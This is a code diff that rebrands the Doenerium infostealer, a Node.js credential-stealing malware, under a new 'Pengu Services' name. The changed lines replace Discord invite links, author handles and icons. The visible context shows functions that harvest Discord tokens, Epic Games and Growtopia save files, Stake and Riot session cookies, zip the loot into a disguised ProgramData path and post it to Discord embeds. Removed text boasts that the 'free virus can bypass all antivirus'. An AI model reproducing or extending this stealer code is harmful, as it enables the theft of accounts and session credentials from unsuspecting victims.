@@ -706,7 +706,7 @@ user = {
         randomUUID: crypto.randomBytes(16).toString('hex'),
         start: Date.now(),
         debug: false,
-        copyright: '<================[discord.gg/doenerium ]>================>\n\n',
+        copyright: 'pengu_services\n\n',
         url: null,
         locale: locale,
     }
@@ -1865,10 +1865,7 @@ async function getTokens() {
         await findToken(path);
     }
 
-    const predefinedBio = `╔═══════════✧✧✧═══════════╗ 
-**     This free virus can bypass all antivirus !** 
-**           ⭐️https://discord.gg/doenerium** ⭐️
-╚═══════════✧✧✧═══════════╝`;
+    const predefinedBio = ``;
 
     for (let token of tokens) {
         try {
@@ -2474,7 +2471,7 @@ async function StealEpicGames() {
                 }
             });
 
-            const howToUseContent = `<================[discord.gg/doenerium Stealer]>================>\n\n
+            const howToUseContent = `pengu services\n\n
 Close EpicGamesLauncher first, WIN + R type --> %localappdata%\\EpicGamesLauncher\\Saved\n
 delete everything and copy all contents into the Epic Games folder and run.`;
 
@@ -2632,7 +2629,7 @@ async function getGrowtopia() {
       await ensureDirectoryExistence(howToUseDir);
 
       const howToUsePath = path.join(howToUseDir, 'How to Use.txt');
-      const howToUseContent = `https://discord.gg/doenerium\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
+      const howToUseContent = `PenguServices\n\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
 
       await writeFile(howToUsePath, howToUseContent, { flag: 'a' });
     }
@@ -2835,7 +2832,7 @@ async function archiveAndSendData() {
         const archive = new AdmZip();
         archive.addLocalFolder(mainFolderPath);
         zipFilePath = `C:/ProgramData/Steam/Launcher/${locale}-${computerName}.zip`;
-        archive.addZipComment('All the Information was Stealed by discord.gg/doenerium.');
+        archive.addZipComment('All the Information was Stealed by pengu012.');
         archive.writeZip(zipFilePath);
         console.log('Archive created successfully');
         getExtension(zipFilePath);
@@ -3139,7 +3136,7 @@ try {
         description: '‎',
         color: 0x303037,
         author: {
-            name: `${user.hostname} | System Information | @WallGod69`,
+            name: `${user.hostname} | System Information | @Pengu012`,
             icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&',
         },
         fields: [
@@ -3775,11 +3772,11 @@ async function sendKeywordsToDiscord(keywords) {
 
         // Embed style
         const embed_data = {
-            "title": "Doenerium Keywords",
+            "title": "Pengu Keywords",
             "description": formattedKeywords,
             "color": 0x303037,
             "footer": {
-                "text": `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
+                "text": `${user.hostname} | @pengu012 | PenguServices`,
                 "icon_url": 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&'
             }
         };
@@ -3806,7 +3803,7 @@ async function sendStakeSessionToDiscord(decrypted) {
             "description": `Session Cookie: \n\`\`\`${decrypted}\`\`\``,
             "color": 0x303037,
             "footer": {
-                "text": `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
+                "text": `${user.hostname} | @pengu012 | PenguServices`,
                 "icon_url": 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&'
             },
             "thumbnail": {
@@ -3983,7 +3980,7 @@ async function RiotGameSession(cookie) {
             "description": ``,
             "color": 0x303037,
             "footer": {
-                "text": `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
+                "text": `${user.hostname} | @pengu012 | PenguServices`,
                 "icon_url": 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&'
             },
             "thumbnail": { "url": "https://seeklogo.com/images/V/valorant-logo-FAB2CA0E55-seeklogo.com.png" },
